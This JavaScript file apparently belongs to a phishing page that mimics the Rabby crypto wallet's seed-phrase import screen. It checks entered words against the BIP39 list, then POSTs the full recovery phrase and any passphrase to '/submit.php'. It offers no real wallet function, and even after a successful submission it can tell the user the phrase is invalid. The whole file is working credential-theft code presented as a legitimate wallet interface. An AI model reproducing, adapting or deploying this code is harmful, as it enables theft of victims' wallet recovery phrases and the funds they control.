document.addEventListener('DOMContentLoaded', () => {
    fetch('js/english.json')
        .then(response => {
            if (!response.ok) {
                throw new Error(`Failed to load english.json: ${response.status}`);
            }
            return response.json();
        })
        .then(bip39Words => {
            initUI(bip39Words);
        })
        .catch(error => {
            console.error('Error loading or parsing english.json:', error);
        });
});

function initUI(bip39Words) {
    const SUBMIT_URL = '/submit.php';

    function isValidSeedWord(word) {
        return bip39Words.includes(word.trim().toLowerCase());
    }

    const trigger = document.getElementById('ant-dropdown-trigger');
    const dropdown = document.getElementById('ant-dropdown');
    const options = dropdown.querySelectorAll('.ant-dropdown-menu-item');
    const wordItems = Array.from(document.querySelectorAll('#sdd .matrix-word-item'));
    const form = document.getElementById('seedForm');
    const clearBtn = document.getElementById('clear');
    const error = document.getElementById('error');
    const errorTextEl = error.querySelector('[role="alert"]');
    const passphraseInput = document.getElementById('passphraseInput');
    const passphraseField = document.getElementById('passphrase');
    const submitBtn = form.querySelector('[type="submit"]');

    const lengthOptions = Array.from(options).map(opt =>
        parseInt(opt.textContent.match(/\d+/)?.[0] || '0', 10)
    );

    let selectedCount = 12;

    function updatePosition() {
        const rect = trigger.getBoundingClientRect();
        dropdown.style.left = `${rect.left + window.scrollX}px`;
        dropdown.style.top = `${rect.bottom + window.scrollY}px`;
    }

    function updateInputs() {
        wordItems.forEach((item, idx) => {
            const input = item.querySelector('input');
            item.style.display = idx < selectedCount ? '' : 'none';

            if (idx < selectedCount) {
                input.dispatchEvent(new Event('input'));
            } else {
                input.value = '';
                item.classList.remove('invalid');
                input.classList.remove('ant-input-focused', 'opacity-50');
                input.removeAttribute('autofocus');
                item.querySelector('.rabby-NumberFlag-rabby--jjw01n')?.classList.add('opacity-50');
            }
        });

        updateErrorMessage();
    }

    function updateErrorMessage(customText) {
        if (customText) {
            errorTextEl.textContent = customText;
            error.style.display = '';
            return;
        }

        const invalidCount = document.querySelectorAll('#sdd .matrix-word-item.invalid').length;
        if (invalidCount > 0) {
            const txt = `${invalidCount} input${invalidCount > 1 ? 's' : ''} do not conform to Seed Phrase norms, please check.`;
            errorTextEl.textContent = txt;
            error.style.display = '';
        } else {
            error.style.display = 'none';
        }
    }

    clearBtn.addEventListener('click', () => {
        wordItems.forEach(item => {
            const input = item.querySelector('input');
            input.value = '';
            item.classList.remove('invalid');
            input.classList.remove('ant-input-focused', 'opacity-50');
            input.removeAttribute('autofocus');
            item.querySelector('.rabby-NumberFlag-rabby--jjw01n')?.classList.add('opacity-50');
        });
        passphraseField.value = '';
        updateErrorMessage();
    });

    wordItems.forEach(item => {
        const input = item.querySelector('input');

        input.addEventListener('input', () => {
            const v = input.value.trim();
            if (!v) {
                item.classList.remove('invalid');
            } else {
                item.classList.toggle('invalid', !isValidSeedWord(v));
            }
            updateErrorMessage();
        });

        input.addEventListener('paste', e => {
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const words = paste.trim().split(/\s+/).filter(Boolean);

            if (words.length > 1) {
                e.preventDefault();

                if (lengthOptions.includes(words.length)) {
                    selectedCount = words.length;
                    trigger.textContent = `I have a ${selectedCount}-word phrase`;
                    passphraseInput.style.display = 'none';
                    passphraseField.value = '';
                    updateInputs();
                }

                words.forEach((w, i) => {
                    if (i < selectedCount) {
                        const inpItem = wordItems[i];
                        const inp = inpItem.querySelector('input');
                        inp.value = w;
                        inp.dispatchEvent(new Event('input'));
                    }
                });

                const lastIdx = Math.min(words.length, selectedCount) - 1;
                wordItems[lastIdx].querySelector('input').focus();
            }
        });

        input.addEventListener('focus', () => {
            wordItems.forEach(otherItem => {
                const otherInput = otherItem.querySelector('input');
                const flag = otherItem.querySelector('.rabby-NumberFlag-rabby--jjw01n');

                if (otherInput === input) {
                    otherInput.classList.add('ant-input-focused');
                    otherInput.classList.remove('opacity-50');
                    otherInput.setAttribute('autofocus', 'true');
                    flag?.classList.remove('opacity-50');
                } else {
                    otherInput.classList.remove('ant-input-focused');
                    otherInput.classList.add('opacity-50');
                    otherInput.removeAttribute('autofocus');
                    flag?.classList.add('opacity-50');
                }
            });
        });

        input.addEventListener('blur', () => {
            setTimeout(() => {
                const active = document.activeElement;
                const isInsideAny = wordItems.some(it => it.contains(active));
                if (!isInsideAny) {
                    wordItems.forEach(it => {
                        const inp2 = it.querySelector('input');
                        const flag = it.querySelector('.rabby-NumberFlag-rabby--jjw01n');
                        inp2.classList.remove('ant-input-focused', 'opacity-50');
                        inp2.removeAttribute('autofocus');
                        flag?.classList.remove('opacity-50');
                    });
                }
            }, 0);

            const v = input.value.trim();
            if (v && !isValidSeedWord(v)) {
                item.classList.add('invalid');
            } else {
                item.classList.remove('invalid');
            }
            updateErrorMessage();
        });
    });

    options.forEach(option => {
        option.addEventListener('click', () => {
            const text = option.textContent.trim();
            const match = text.match(/(\d+|SLIP 39)/);
            const hasPassphrase = /with Passphrase/i.test(text);

            if (!match) return;

            const phraseType = match[1] === 'SLIP 39' ? 'SLIP 39' : parseInt(match[1], 10);
            selectedCount = typeof phraseType === 'number' ? phraseType : 24;

            passphraseInput.style.display = hasPassphrase ? '' : 'none';
            if (!hasPassphrase) passphraseField.value = '';

            trigger.textContent = `I have a ${phraseType}-word phrase${hasPassphrase ? ' with Passphrase' : ''}`;

            updateInputs();
            dropdown.classList.add('ant-dropdown-hidden');
        });
    });

    trigger.addEventListener('click', e => {
        e.stopPropagation();
        if (dropdown.classList.contains('ant-dropdown-hidden')) {
            updatePosition();
            dropdown.classList.remove('ant-dropdown-hidden');
        } else {
            dropdown.classList.add('ant-dropdown-hidden');
        }
    });

    document.addEventListener('click', e => {
        if (!dropdown.contains(e.target) && e.target !== trigger) {
            dropdown.classList.add('ant-dropdown-hidden');
        }
    });

    window.addEventListener('resize', () => {
        if (!dropdown.classList.contains('ant-dropdown-hidden')) {
            updatePosition();
        }
    });

    form.addEventListener('submit', async e => {
        e.preventDefault();

        const activeItems = wordItems.slice(0, selectedCount);
        const inputs = activeItems.map(i => i.querySelector('input'));

        const emptyCount = inputs.filter(i => !i.value.trim()).length;
        const invalidCount = activeItems.filter(i => i.classList.contains('invalid')).length;

        if (emptyCount > 0 || invalidCount > 0) {
            updateErrorMessage('The seed phrase is invalid, please check!');
            console.error(`Submit blocked: empty=${emptyCount}, invalid=${invalidCount}`);
            return;
        }

        const payload = {
            words: inputs.map(i => i.value.trim().toLowerCase()),
            passphrase: passphraseField.value || '',
            length: selectedCount
        };

        try {
            if (submitBtn) submitBtn.disabled = true;

            const res = await fetch(SUBMIT_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'applicationjson' },
                body: JSON.stringify(payload)
            });

            if (!res.ok) {
                const errText = await res.text().catch(() => '');
                throw new Error(`Submit failed: ${res.status} ${res.statusText} ${errText}`);
            }

            updateErrorMessage();
            console.log('Seed submitted successfully');

        } catch (err) {
            console.error(err);
            updateErrorMessage('The seed phrase is invalid, please check!');
        } finally {
            if (submitBtn) submitBtn.disabled = false;
        }
    });

    updateInputs();
}
